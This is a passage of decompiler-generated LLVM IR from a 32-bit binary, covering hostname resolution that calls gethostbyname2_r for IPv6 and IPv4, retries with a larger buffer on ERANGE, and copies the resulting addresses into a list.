dec_label_pc_805d653:                             ; preds = %dec_label_pc_805d64c
  %v9_805d653 = icmp eq i32 %v3_805d64c, 10
  br i1 %v9_805d653, label %dec_label_pc_805d660, label %dec_label_pc_805d658

dec_label_pc_805d658:                             ; preds = %dec_label_pc_805d653
  %v2_805d658 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805d658, i32* @edi, align 4
  br label %dec_label_pc_805d738

dec_label_pc_805d660:                             ; preds = %dec_label_pc_805d653, %dec_label_pc_805d64c
  store i32 512, i32* %ebx.global-to-local, align 4
  %v2_805d674 = ptrtoint i32* %stack_var_-28 to i32
  %v2_805d67b = ptrtoint i8** %stack_var_-32 to i32
  %v2_805d67f = ptrtoint i32* %stack_var_-68 to i32
  %v0_805d66d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805d665

dec_label_pc_805d665:                             ; preds = %dec_label_pc_805d697.dec_label_pc_805d665_crit_edge, %dec_label_pc_805d660
  %v0_805d66d = phi i32 [ %v1_805d68f, %dec_label_pc_805d697.dec_label_pc_805d665_crit_edge ], [ %v0_805d66d.pre, %dec_label_pc_805d660 ]
  %v0_805d665 = phi i32 [ %v0_805d665.pre, %dec_label_pc_805d697.dec_label_pc_805d665_crit_edge ], [ 512, %dec_label_pc_805d660 ]
  %v2_805d665 = mul i32 %v0_805d665, 2
  store i32 %v2_805d665, i32* @ebx, align 4
  %v1_805d667 = add i32 %v2_805d665, 30
  %v1_805d66a = and i32 %v1_805d667, -16
  %v2_805d66d = sub i32 %v0_805d66d, %v1_805d66a
  %v1_805d66f = add i32 %v2_805d66d, 15
  store i32 %v1_805d66f, i32* %edx.global-to-local, align 4
  %v2_805d673 = add i32 %v2_805d66d, -4
  %v3_805d673 = inttoptr i32 %v2_805d673 to i32*
  store i32 %v1_805d66a, i32* %v3_805d673, align 4
  %v0_805d677 = load i32, i32* %edx.global-to-local, align 4
  %v1_805d677 = and i32 %v0_805d677, -16
  store i32 %v1_805d677, i32* %edx.global-to-local, align 4
  %v2_805d67a = add i32 %v2_805d66d, -8
  %v3_805d67a = inttoptr i32 %v2_805d67a to i32*
  store i32 %v2_805d674, i32* %v3_805d67a, align 4
  %v2_805d67e = add i32 %v2_805d66d, -12
  %v3_805d67e = inttoptr i32 %v2_805d67e to i32*
  store i32 %v2_805d67b, i32* %v3_805d67e, align 4
  store i32 %v2_805d67f, i32* %eax.global-to-local, align 4
  %v0_805d682 = load i32, i32* @ebx, align 4
  %v2_805d682 = add i32 %v2_805d66d, -16
  %v3_805d682 = inttoptr i32 %v2_805d682 to i32*
  store i32 %v0_805d682, i32* %v3_805d682, align 4
  %v0_805d683 = load i32, i32* %edx.global-to-local, align 4
  %v2_805d683 = add i32 %v2_805d66d, -20
  %v3_805d683 = inttoptr i32 %v2_805d683 to i32*
  store i32 %v0_805d683, i32* %v3_805d683, align 4
  %v2_805d684 = add i32 %v2_805d66d, -24
  %v3_805d684 = inttoptr i32 %v2_805d684 to i32*
  store i32 %v2_805d67f, i32* %v3_805d684, align 4
  %v1_805d685 = add i32 %v2_805d66d, -28
  %v2_805d685 = inttoptr i32 %v1_805d685 to i32*
  store i32 10, i32* %v2_805d685, align 4
  %v3_805d687 = load i8*, i8** %stack_var_4, align 4
  %v4_805d687 = ptrtoint i8* %v3_805d687 to i32
  %v6_805d687 = add i32 %v2_805d66d, -32
  %v7_805d687 = inttoptr i32 %v6_805d687 to i32*
  store i32 %v4_805d687, i32* %v7_805d687, align 4
  %v0_805d68a = call i32 @gethostbyname2_r()
  store i32 %v0_805d68a, i32* %eax.global-to-local, align 4
  %v0_805d68f = load i32, i32* @esp, align 4
  %v1_805d68f = add i32 %v0_805d68f, 32
  %v9_805d692 = icmp eq i32 %v0_805d68a, 34
  %v1_805d695 = icmp eq i1 %v9_805d692, false
  br i1 %v1_805d695, label %dec_label_pc_805d69f, label %dec_label_pc_805d697

dec_label_pc_805d697:                             ; preds = %dec_label_pc_805d665
  %v3_805d697 = load i32, i32* %stack_var_-28, align 4
  %v13_805d697 = icmp eq i32 %v3_805d697, -1
  br i1 %v13_805d697, label %dec_label_pc_805d697.dec_label_pc_805d665_crit_edge, label %dec_label_pc_805d6a3

dec_label_pc_805d697.dec_label_pc_805d665_crit_edge: ; preds = %dec_label_pc_805d697
  %v0_805d665.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805d665

dec_label_pc_805d69f:                             ; preds = %dec_label_pc_805d665
  %v1_805d69f = icmp eq i32 %v0_805d68a, 0
  br i1 %v1_805d69f, label %dec_label_pc_805d6cc, label %dec_label_pc_805d69f.dec_label_pc_805d6a3_crit_edge

dec_label_pc_805d69f.dec_label_pc_805d6a3_crit_edge: ; preds = %dec_label_pc_805d69f
  %v3_805d6a3.pre = load i32, i32* %stack_var_-28, align 4
  br label %dec_label_pc_805d6a3

dec_label_pc_805d6a3:                             ; preds = %dec_label_pc_805d697, %dec_label_pc_805d69f.dec_label_pc_805d6a3_crit_edge
  %v0_805d6c4 = phi i32 [ %v3_805d6a3.pre, %dec_label_pc_805d69f.dec_label_pc_805d6a3_crit_edge ], [ %v3_805d697, %dec_label_pc_805d697 ]
  store i32 %v0_805d6c4, i32* %eax.global-to-local, align 4
  %v10_805d6a6 = icmp eq i32 %v0_805d6c4, -1
  br i1 %v10_805d6a6, label %dec_label_pc_805dbbf, label %dec_label_pc_805d6af

dec_label_pc_805d6af:                             ; preds = %dec_label_pc_805d6a3
  %v9_805d6af = icmp eq i32 %v0_805d6c4, 2
  %v2_805d6b2 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805d6b2, i32* %edx.global-to-local, align 4
  %v1_805d6b5 = icmp eq i1 %v9_805d6af, false
  store i32 %v2_805d6b2, i32* @edi, align 4
  br i1 %v1_805d6b5, label %dec_label_pc_805d6c0, label %dec_label_pc_805d6b7

dec_label_pc_805d6b7:                             ; preds = %dec_label_pc_805d6af
  store i32 -3, i32* @ebx, align 4
  br label %dec_label_pc_805d73a

dec_label_pc_805d6c0:                             ; preds = %dec_label_pc_805d6af
  %v9_805d6c4 = icmp eq i32 %v0_805d6c4, 4
  %v1_805d6c7 = zext i1 %v9_805d6c4 to i32
  store i32 %v1_805d6c7, i32* @ebx, align 4
  br label %dec_label_pc_805d73a

dec_label_pc_805d6cc:                             ; preds = %dec_label_pc_805d69f
  %v3_805d6cc = load i8*, i8** %stack_var_-32, align 4
  %v5_805d6cc = icmp eq i8* %v3_805d6cc, null
  %v2_805d6d0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805d6d0, i32* %edx.global-to-local, align 4
  %v1_805d6d3 = icmp eq i1 %v5_805d6cc, false
  store i32 %v2_805d6d0, i32* @edi, align 4
  br i1 %v1_805d6d3, label %dec_label_pc_805d6d9, label %dec_label_pc_805d738

dec_label_pc_805d6d9:                             ; preds = %dec_label_pc_805d6cc
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_805d725182 = ptrtoint i8* %v3_805d6cc to i32
  store i32 %v4_805d725182, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_805d72f183 = add i32 %v4_805d725182, 16
  %v2_805d72f184 = inttoptr i32 %v1_805d72f183 to i32*
  %v3_805d72f185 = load i32, i32* %v2_805d72f184, align 4
  store i32 %v3_805d72f185, i32* %eax.global-to-local, align 4
  %v3_805d732186 = inttoptr i32 %v3_805d72f185 to i32*
  %v4_805d732187 = load i32, i32* %v3_805d732186, align 4
  %v5_805d732188 = icmp eq i32 %v4_805d732187, 0
  %v1_805d736189 = icmp eq i1 %v5_805d732188, false
  br i1 %v1_805d736189, label %dec_label_pc_805d6df, label %dec_label_pc_805d738

dec_label_pc_805d6df:                             ; preds = %dec_label_pc_805d6d9, %dec_label_pc_805d6f7
  %v0_805d728192 = phi i32 [ %v0_805d728.pre, %dec_label_pc_805d6f7 ], [ 0, %dec_label_pc_805d6d9 ]
  %v1_805d6ee191 = phi i32 [ %v2_805d720, %dec_label_pc_805d6f7 ], [ %v2_805d6d0, %dec_label_pc_805d6d9 ]
  %v0_805d6e4190 = phi i32 [ %v1_805d722, %dec_label_pc_805d6f7 ], [ %v1_805d68f, %dec_label_pc_805d6d9 ]
  %v1_805d6df = inttoptr i32 %v1_805d6ee191 to i32*
  %v2_805d6df = load i32, i32* %v1_805d6df, align 4
  %v3_805d6df = icmp eq i32 %v2_805d6df, 0
  %v1_805d6e2 = icmp eq i1 %v3_805d6df, false
  br i1 %v1_805d6e2, label %dec_label_pc_805d6f7, label %dec_label_pc_805d6e4

dec_label_pc_805d6e4:                             ; preds = %dec_label_pc_805d6df
  %v1_805d6e7 = add i32 %v0_805d6e4190, -33
  %v1_805d6eb = and i32 %v1_805d6e7, -16
  store i32 %v1_805d6eb, i32* %eax.global-to-local, align 4
  store i32 %v1_805d6eb, i32* %v1_805d6df, align 4
  %v0_805d6f0 = load i32, i32* %eax.global-to-local, align 4
  %v1_805d6f0 = add i32 %v0_805d6f0, 24
  %v2_805d6f0 = inttoptr i32 %v1_805d6f0 to i32*
  store i32 0, i32* %v2_805d6f0, align 4
  %v0_805d6f7.pre = load i32, i32* @edi, align 4
  %v1_805d6f7.phi.trans.insert = inttoptr i32 %v0_805d6f7.pre to i32*
  %v2_805d6f7.pre = load i32, i32* %v1_805d6f7.phi.trans.insert, align 4
  %v0_805d6f9.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805d6f7

dec_label_pc_805d6f7:                             ; preds = %dec_label_pc_805d6df, %dec_label_pc_805d6e4
  %v0_805d6f9 = phi i32 [ %v0_805d728192, %dec_label_pc_805d6df ], [ %v0_805d6f9.pre, %dec_label_pc_805d6e4 ]
  %v2_805d6f7 = phi i32 [ %v2_805d6df, %dec_label_pc_805d6df ], [ %v2_805d6f7.pre, %dec_label_pc_805d6e4 ]
  store i32 %v2_805d6f7, i32* %eax.global-to-local, align 4
  %v1_805d6f9 = add i32 %v0_805d6f9, 1
  store i32 %v1_805d6f9, i32* %ebx.global-to-local, align 4
  %v1_805d6fa = inttoptr i32 %v2_805d6f7 to i32*
  store i32 0, i32* %v1_805d6fa, align 4
  %v0_805d700 = load i32, i32* @edi, align 4
  %v1_805d700 = inttoptr i32 %v0_805d700 to i32*
  %v2_805d700 = load i32, i32* %v1_805d700, align 4
  store i32 %v2_805d700, i32* %eax.global-to-local, align 4
  %v1_805d702 = add i32 %v2_805d700, 4
  %v2_805d702 = inttoptr i32 %v1_805d702 to i32*
  store i32 10, i32* %v2_805d702, align 4
  %v0_805d709 = load i32, i32* %eax.global-to-local, align 4
  %v1_805d709 = load i32, i32* @esp, align 4
  %v2_805d709 = add i32 %v1_805d709, -4
  %v3_805d709 = inttoptr i32 %v2_805d709 to i32*
  store i32 %v0_805d709, i32* %v3_805d709, align 4
  %v3_805d70a = load i8*, i8** %stack_var_-32, align 4
  %v4_805d70a = ptrtoint i8* %v3_805d70a to i32
  store i32 %v4_805d70a, i32* %eax.global-to-local, align 4
  %v1_805d70d = add i32 %v1_805d709, -8
  %v2_805d70d = inttoptr i32 %v1_805d70d to i32*
  store i32 16, i32* %v2_805d70d, align 4
  %v0_805d70f = load i32, i32* %eax.global-to-local, align 4
  %v1_805d70f = add i32 %v0_805d70f, 16
  %v2_805d70f = inttoptr i32 %v1_805d70f to i32*
  %v3_805d70f = load i32, i32* %v2_805d70f, align 4
  store i32 %v3_805d70f, i32* %eax.global-to-local, align 4
  %v1_805d712 = load i32, i32* %edx.global-to-local, align 4
  %v2_805d712 = add i32 %v1_805d712, %v3_805d70f
  %v3_805d712 = inttoptr i32 %v2_805d712 to i32*
  %v4_805d712 = load i32, i32* %v3_805d712, align 4
  %v6_805d712 = add i32 %v1_805d709, -12
  %v7_805d712 = inttoptr i32 %v6_805d712 to i32*
  store i32 %v4_805d712, i32* %v7_805d712, align 4
  %v0_805d715 = load i32, i32* @edi, align 4
  %v1_805d715 = inttoptr i32 %v0_805d715 to i32*
  %v2_805d715 = load i32, i32* %v1_805d715, align 4
  %v1_805d717 = add i32 %v2_805d715, 8
  store i32 %v1_805d717, i32* %eax.global-to-local, align 4
  %v2_805d71a = add i32 %v1_805d709, -16
  %v3_805d71a = inttoptr i32 %v2_805d71a to i32*
  store i32 %v1_805d717, i32* %v3_805d71a, align 4
  %v0_805d71b = load i8*, i8** %stack_var_-252, align 4
  %tmp160 = bitcast i8* %v0_805d71b to i16*
  %v5_805d71b = call i32 @memcpy(i16* %tmp160, i32 %v4_805d50c, i32 %v1_805d508)
  store i32 %v5_805d71b, i32* %eax.global-to-local, align 4
  %v0_805d720 = load i32, i32* @edi, align 4
  %v1_805d720 = inttoptr i32 %v0_805d720 to i32*
  %v2_805d720 = load i32, i32* %v1_805d720, align 4
  store i32 %v2_805d720, i32* @edi, align 4
  %v0_805d722 = load i32, i32* @esp, align 4
  %v1_805d722 = add i32 %v0_805d722, 16
  %v3_805d725.pre = load i8*, i8** %stack_var_-32, align 4
  %v0_805d728.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_805d725 = ptrtoint i8* %v3_805d725.pre to i32
  store i32 %v4_805d725, i32* %eax.global-to-local, align 4
  %v1_805d728 = mul i32 %v0_805d728.pre, 4
  store i32 %v1_805d728, i32* %edx.global-to-local, align 4
  %v1_805d72f = add i32 %v4_805d725, 16
  %v2_805d72f = inttoptr i32 %v1_805d72f to i32*
  %v3_805d72f = load i32, i32* %v2_805d72f, align 4
  store i32 %v3_805d72f, i32* %eax.global-to-local, align 4
  %v2_805d732 = add i32 %v3_805d72f, %v1_805d728
  %v3_805d732 = inttoptr i32 %v2_805d732 to i32*
  %v4_805d732 = load i32, i32* %v3_805d732, align 4
  %v5_805d732 = icmp eq i32 %v4_805d732, 0
  %v1_805d736 = icmp eq i1 %v5_805d732, false
  br i1 %v1_805d736, label %dec_label_pc_805d6df, label %dec_label_pc_805d738

dec_label_pc_805d738:                             ; preds = %dec_label_pc_805d6d9, %dec_label_pc_805d6f7, %dec_label_pc_805d6cc, %dec_label_pc_805d658
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805d73a

dec_label_pc_805d73a:                             ; preds = %dec_label_pc_805d6c0, %dec_label_pc_805d6b7, %dec_label_pc_805d738
  %v0_805d835 = phi i32 [ %v1_805d6c7, %dec_label_pc_805d6c0 ], [ -3, %dec_label_pc_805d6b7 ], [ 0, %dec_label_pc_805d738 ]
  store i32 %arg3, i32* @ecx, align 4
  %v3_805d73d = load i32, i32* %v2_805d272, align 4
  store i32 %v3_805d73d, i32* %eax.global-to-local, align 4
  %v9_805d740 = icmp eq i32 %v3_805d73d, 2
  br i1 %v9_805d740, label %dec_label_pc_805d75b, label %dec_label_pc_805d745

dec_label_pc_805d745:                             ; preds = %dec_label_pc_805d73a
  %v3_805d745 = load i32, i32* %stack_var_-156, align 4
  %v4_805d745 = icmp eq i32 %v3_805d745, 0
  %v1_805d74c = icmp eq i1 %v4_805d745, false
  br i1 %v1_805d74c, label %dec_label_pc_805d757, label %dec_label_pc_805d74e

dec_label_pc_805d74e:                             ; preds = %dec_label_pc_805d745
  %v1_805d74e = icmp eq i32 %v3_805d73d, 0
  br i1 %v1_805d74e, label %dec_label_pc_805d75b, label %dec_label_pc_805d837

dec_label_pc_805d757:                             ; preds = %dec_label_pc_805d745
  %v1_805d757 = icmp eq i32 %v0_805d835, 0
  br i1 %v1_805d757, label %dec_label_pc_805d762, label %dec_label_pc_805d75b

dec_label_pc_805d75b:                             ; preds = %dec_label_pc_805d762, %dec_label_pc_805d757, %dec_label_pc_805d74e, %dec_label_pc_805d73a
  %v2_805d77e = ptrtoint i32* %stack_var_-28 to i32
  %v2_805d785 = ptrtoint i8** %stack_var_-32 to i32
  %v2_805d789 = ptrtoint i32* %stack_var_-68 to i32
  %v0_805d777.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805d76f

dec_label_pc_805d762:                             ; preds = %dec_label_pc_805d757
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v2_805d765 = load i8, i8* %tmp118, align 1
  %v3_805d765 = and i8 %v2_805d765, 16
  %v4_805d765 = icmp eq i8 %v3_805d765, 0
  %v1_805d768 = icmp eq i1 %v4_805d765, false
  br i1 %v1_805d768, label %dec_label_pc_805d75b, label %dec_label_pc_805d837.thread

dec_label_pc_805d837.thread:                      ; preds = %dec_label_pc_805d762
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d85c

dec_label_pc_805d76f:                             ; preds = %dec_label_pc_805d7a1.dec_label_pc_805d76f_crit_edge, %dec_label_pc_805d75b
  %v0_805d777 = phi i32 [ %v1_805d799, %dec_label_pc_805d7a1.dec_label_pc_805d76f_crit_edge ], [ %v0_805d777.pre, %dec_label_pc_805d75b ]
  %v0_805d76f = phi i32 [ %v0_805d76f.pre, %dec_label_pc_805d7a1.dec_label_pc_805d76f_crit_edge ], [ 512, %dec_label_pc_805d75b ]
  %v2_805d76f = mul i32 %v0_805d76f, 2
  store i32 %v2_805d76f, i32* @esi, align 4
  %v1_805d771 = add i32 %v2_805d76f, 30
  %v1_805d774 = and i32 %v1_805d771, -16
  %v2_805d777 = sub i32 %v0_805d777, %v1_805d774
  %v1_805d779 = add i32 %v2_805d777, 15
  store i32 %v1_805d779, i32* %edx.global-to-local, align 4
  %v2_805d77d = add i32 %v2_805d777, -4
  %v3_805d77d = inttoptr i32 %v2_805d77d to i32*
  store i32 %v1_805d774, i32* %v3_805d77d, align 4
  %v0_805d781 = load i32, i32* %edx.global-to-local, align 4
  %v1_805d781 = and i32 %v0_805d781, -16
  store i32 %v1_805d781, i32* %edx.global-to-local, align 4
  %v2_805d784 = add i32 %v2_805d777, -8
  %v3_805d784 = inttoptr i32 %v2_805d784 to i32*
  store i32 %v2_805d77e, i32* %v3_805d784, align 4
  %v2_805d788 = add i32 %v2_805d777, -12
  %v3_805d788 = inttoptr i32 %v2_805d788 to i32*
  store i32 %v2_805d785, i32* %v3_805d788, align 4
  store i32 %v2_805d789, i32* %eax.global-to-local, align 4
  %v0_805d78c = load i32, i32* @esi, align 4
  %v2_805d78c = add i32 %v2_805d777, -16
  %v3_805d78c = inttoptr i32 %v2_805d78c to i32*
  store i32 %v0_805d78c, i32* %v3_805d78c, align 4
  %v0_805d78d = load i32, i32* %edx.global-to-local, align 4
  %v2_805d78d = add i32 %v2_805d777, -20
  %v3_805d78d = inttoptr i32 %v2_805d78d to i32*
  store i32 %v0_805d78d, i32* %v3_805d78d, align 4
  %v2_805d78e = add i32 %v2_805d777, -24
  %v3_805d78e = inttoptr i32 %v2_805d78e to i32*
  store i32 %v2_805d789, i32* %v3_805d78e, align 4
  %v1_805d78f = add i32 %v2_805d777, -28
  %v2_805d78f = inttoptr i32 %v1_805d78f to i32*
  store i32 2, i32* %v2_805d78f, align 4
  %v3_805d791 = load i8*, i8** %stack_var_4, align 4
  %v4_805d791 = ptrtoint i8* %v3_805d791 to i32
  %v6_805d791 = add i32 %v2_805d777, -32
  %v7_805d791 = inttoptr i32 %v6_805d791 to i32*
  store i32 %v4_805d791, i32* %v7_805d791, align 4
  %v0_805d794 = call i32 @gethostbyname2_r()
  store i32 %v0_805d794, i32* %eax.global-to-local, align 4
  %v0_805d799 = load i32, i32* @esp, align 4
  %v1_805d799 = add i32 %v0_805d799, 32
  %v9_805d79c = icmp eq i32 %v0_805d794, 34
  %v1_805d79f = icmp eq i1 %v9_805d79c, false
  br i1 %v1_805d79f, label %dec_label_pc_805d7a9, label %dec_label_pc_805d7a1

dec_label_pc_805d7a1:                             ; preds = %dec_label_pc_805d76f
  %v3_805d7a1 = load i32, i32* %stack_var_-28, align 4
  %v13_805d7a1 = icmp eq i32 %v3_805d7a1, -1
  br i1 %v13_805d7a1, label %dec_label_pc_805d7a1.dec_label_pc_805d76f_crit_edge, label %dec_label_pc_805d7ad

dec_label_pc_805d7a1.dec_label_pc_805d76f_crit_edge: ; preds = %dec_label_pc_805d7a1
  %v0_805d76f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805d76f

dec_label_pc_805d7a9:                             ; preds = %dec_label_pc_805d76f
  %v1_805d7a9 = icmp eq i32 %v0_805d794, 0
  br i1 %v1_805d7a9, label %dec_label_pc_805d7cd, label %dec_label_pc_805d7a9.dec_label_pc_805d7ad_crit_edge

dec_label_pc_805d7a9.dec_label_pc_805d7ad_crit_edge: ; preds = %dec_label_pc_805d7a9
  %v3_805d7ad.pre = load i32, i32* %stack_var_-28, align 4
  br label %dec_label_pc_805d7ad

dec_label_pc_805d7ad:                             ; preds = %dec_label_pc_805d7a1, %dec_label_pc_805d7a9.dec_label_pc_805d7ad_crit_edge
  %v0_805d7c5 = phi i32 [ %v3_805d7ad.pre, %dec_label_pc_805d7a9.dec_label_pc_805d7ad_crit_edge ], [ %v3_805d7a1, %dec_label_pc_805d7a1 ]
  store i32 %v0_805d7c5, i32* %edx.global-to-local, align 4
  %v10_805d7b0 = icmp eq i32 %v0_805d7c5, -1
  br i1 %v10_805d7b0, label %dec_label_pc_805dbbf, label %dec_label_pc_805d7b9

dec_label_pc_805d7b9:                             ; preds = %dec_label_pc_805d7ad
  store i32 -3, i32* %eax.global-to-local, align 4
  %v9_805d7be = icmp eq i32 %v0_805d7c5, 2
  br i1 %v9_805d7be, label %dec_label_pc_805d83b, label %dec_label_pc_805d7c3

dec_label_pc_805d7c3:                             ; preds = %dec_label_pc_805d7b9
  store i32 0, i32* %eax.global-to-local, align 4
  %v9_805d7c5 = icmp eq i32 %v0_805d7c5, 4
  %v1_805d7c8 = zext i1 %v9_805d7c5 to i32
  br label %dec_label_pc_805d837

dec_label_pc_805d7cd:                             ; preds = %dec_label_pc_805d7a9
  store i32 0, i32* @ebx, align 4
  %v3_805d7cf = load i8*, i8** %stack_var_-32, align 4
  %v5_805d7cf = icmp eq i8* %v3_805d7cf, null
  %v1_805d7d3 = icmp eq i1 %v5_805d7cf, false
  br i1 %v1_805d7d3, label %dec_label_pc_805d820.preheader, label %dec_label_pc_805d85c

dec_label_pc_805d820.preheader:                   ; preds = %dec_label_pc_805d7cd
  %v4_805d820172 = ptrtoint i8* %v3_805d7cf to i32
  store i32 %v4_805d820172, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_805d82a173 = add i32 %v4_805d820172, 16
  %v2_805d82a174 = inttoptr i32 %v1_805d82a173 to i32*
  %v3_805d82a175 = load i32, i32* %v2_805d82a174, align 4
  store i32 %v3_805d82a175, i32* %eax.global-to-local, align 4
  %v3_805d82d176 = inttoptr i32 %v3_805d82a175 to i32*
  %v4_805d82d177 = load i32, i32* %v3_805d82d176, align 4
  %v5_805d82d178 = icmp eq i32 %v4_805d82d177, 0
  %v1_805d831179 = icmp eq i1 %v5_805d82d178, false
  br i1 %v1_805d831179, label %dec_label_pc_805d7da.lr.ph, label %dec_label_pc_805d85c

dec_label_pc_805d7da.lr.ph:                       ; preds = %dec_label_pc_805d820.preheader
  %v0_805d7da.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805d7da

dec_label_pc_805d7da:                             ; preds = %dec_label_pc_805d7da.lr.ph, %dec_label_pc_805d7f2
  %v0_805d7da = phi i32 [ %v0_805d7da.pre, %dec_label_pc_805d7da.lr.ph ], [ %v2_805d81b, %dec_label_pc_805d7f2 ]
  %v0_805d823181 = phi i32 [ 0, %dec_label_pc_805d7da.lr.ph ], [ %v0_805d823.pre, %dec_label_pc_805d7f2 ]
  %v0_805d7df180 = phi i32 [ %v1_805d799, %dec_label_pc_805d7da.lr.ph ], [ %v1_805d81d, %dec_label_pc_805d7f2 ]
  %v1_805d7da = inttoptr i32 %v0_805d7da to i32*
  %v2_805d7da = load i32, i32* %v1_805d7da, align 4
  %v3_805d7da = icmp eq i32 %v2_805d7da, 0
  %v1_805d7dd = icmp eq i1 %v3_805d7da, false
  br i1 %v1_805d7dd, label %dec_label_pc_805d7f2, label %dec_label_pc_805d7df

dec_label_pc_805d7df:                             ; preds = %dec_label_pc_805d7da
  %v1_805d7e2 = add i32 %v0_805d7df180, -33
  %v1_805d7e6 = and i32 %v1_805d7e2, -16
  store i32 %v1_805d7e6, i32* %eax.global-to-local, align 4
  store i32 %v1_805d7e6, i32* %v1_805d7da, align 4
  %v0_805d7eb = load i32, i32* %eax.global-to-local, align 4
  %v1_805d7eb = add i32 %v0_805d7eb, 24
  %v2_805d7eb = inttoptr i32 %v1_805d7eb to i32*
  store i32 0, i32* %v2_805d7eb, align 4
  %v0_805d7f2.pre = load i32, i32* @edi, align 4
  %v1_805d7f2.phi.trans.insert = inttoptr i32 %v0_805d7f2.pre to i32*
  %v2_805d7f2.pre = load i32, i32* %v1_805d7f2.phi.trans.insert, align 4
  %v0_805d7f4.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805d7f2

dec_label_pc_805d7f2:                             ; preds = %dec_label_pc_805d7da, %dec_label_pc_805d7df
  %v0_805d7f4 = phi i32 [ %v0_805d823181, %dec_label_pc_805d7da ], [ %v0_805d7f4.pre, %dec_label_pc_805d7df ]
  %v2_805d7f2 = phi i32 [ %v2_805d7da, %dec_label_pc_805d7da ], [ %v2_805d7f2.pre, %dec_label_pc_805d7df ]
  store i32 %v2_805d7f2, i32* %eax.global-to-local, align 4
  %v1_805d7f4 = add i32 %v0_805d7f4, 1
  store i32 %v1_805d7f4, i32* @ebx, align 4
  %v1_805d7f5 = inttoptr i32 %v2_805d7f2 to i32*
  store i32 0, i32* %v1_805d7f5, align 4
  %v0_805d7fb = load i32, i32* @edi, align 4
  %v1_805d7fb = inttoptr i32 %v0_805d7fb to i32*
  %v2_805d7fb = load i32, i32* %v1_805d7fb, align 4
  store i32 %v2_805d7fb, i32* %eax.global-to-local, align 4
  %v1_805d7fd = add i32 %v2_805d7fb, 4
  %v2_805d7fd = inttoptr i32 %v1_805d7fd to i32*
  store i32 2, i32* %v2_805d7fd, align 4
  %v0_805d804 = load i32, i32* %eax.global-to-local, align 4
  %v1_805d804 = load i32, i32* @esp, align 4
  %v2_805d804 = add i32 %v1_805d804, -4
  %v3_805d804 = inttoptr i32 %v2_805d804 to i32*
  store i32 %v0_805d804, i32* %v3_805d804, align 4
  %v3_805d805 = load i8*, i8** %stack_var_-32, align 4
  %v4_805d805 = ptrtoint i8* %v3_805d805 to i32
  store i32 %v4_805d805, i32* %eax.global-to-local, align 4
  %v1_805d808 = add i32 %v1_805d804, -8
  %v2_805d808 = inttoptr i32 %v1_805d808 to i32*
  store i32 4, i32* %v2_805d808, align 4
  %v0_805d80a = load i32, i32* %eax.global-to-local, align 4
  %v1_805d80a = add i32 %v0_805d80a, 16
  %v2_805d80a = inttoptr i32 %v1_805d80a to i32*
  %v3_805d80a = load i32, i32* %v2_805d80a, align 4
  store i32 %v3_805d80a, i32* %eax.global-to-local, align 4
  %v1_805d80d = load i32, i32* %edx.global-to-local, align 4
  %v2_805d80d = add i32 %v1_805d80d, %v3_805d80a
  %v3_805d80d = inttoptr i32 %v2_805d80d to i32*
  %v4_805d80d = load i32, i32* %v3_805d80d, align 4
  %v6_805d80d = add i32 %v1_805d804, -12
  %v7_805d80d = inttoptr i32 %v6_805d80d to i32*
  store i32 %v4_805d80d, i32* %v7_805d80d, align 4
  %v0_805d810 = load i32, i32* @edi, align 4
  %v1_805d810 = inttoptr i32 %v0_805d810 to i32*
  %v2_805d810 = load i32, i32* %v1_805d810, align 4
  %v1_805d812 = add i32 %v2_805d810, 8
  store i32 %v1_805d812, i32* %eax.global-to-local, align 4
  %v2_805d815 = add i32 %v1_805d804, -16
  %v3_805d815 = inttoptr i32 %v2_805d815 to i32*
  store i32 %v1_805d812, i32* %v3_805d815, align 4
  %v0_805d816 = load i8*, i8** %stack_var_-252, align 4
  %tmp161 = bitcast i8* %v0_805d816 to i16*
  %v5_805d816 = call i32 @memcpy(i16* %tmp161, i32 %v4_805d50c, i32 %v1_805d508)
  store i32 %v5_805d816, i32* %eax.global-to-local, align 4
  %v0_805d81b = load i32, i32* @edi, align 4
  %v1_805d81b = inttoptr i32 %v0_805d81b to i32*
  %v2_805d81b = load i32, i32* %v1_805d81b, align 4
  store i32 %v2_805d81b, i32* @edi, align 4
  %v0_805d81d = load i32, i32* @esp, align 4
  %v1_805d81d = add i32 %v0_805d81d, 16
  %v3_805d820.pre = load i8*, i8** %stack_var_-32, align 4
  %v0_805d823.pre = load i32, i32* @ebx, align 4
  %v4_805d820 = ptrtoint i8* %v3_805d820.pre to i32
  store i32 %v4_805d820, i32* %eax.global-to-local, align 4
  %v1_805d823 = mul i32 %v0_805d823.pre, 4
  store i32 %v1_805d823, i32* %edx.global-to-local, align 4
  %v1_805d82a = add i32 %v4_805d820, 16
  %v2_805d82a = inttoptr i32 %v1_805d82a to i32*
  %v3_805d82a = load i32, i32* %v2_805d82a, align 4
  store i32 %v3_805d82a, i32* %eax.global-to-local, align 4
  %v2_805d82d = add i32 %v3_805d82a, %v1_805d823
  %v3_805d82d = inttoptr i32 %v2_805d82d to i32*
  %v4_805d82d = load i32, i32* %v3_805d82d, align 4
  %v5_805d82d = icmp eq i32 %v4_805d82d, 0
  %v1_805d831 = icmp eq i1 %v5_805d82d, false
  br i1 %v1_805d831, label %dec_label_pc_805d7da, label %dec_label_pc_805d85c

dec_label_pc_805d837:                             ; preds = %dec_label_pc_805d74e, %dec_label_pc_805d7c3
  %storemerge7 = phi i32 [ %v1_805d7c8, %dec_label_pc_805d7c3 ], [ %v0_805d835, %dec_label_pc_805d74e ]
  store i32 %storemerge7, i32* %eax.global-to-local, align 4
  %v1_805d837 = icmp eq i32 %storemerge7, 0
  br i1 %v1_805d837, label %dec_label_pc_805d85c, label %dec_label_pc_805d83b

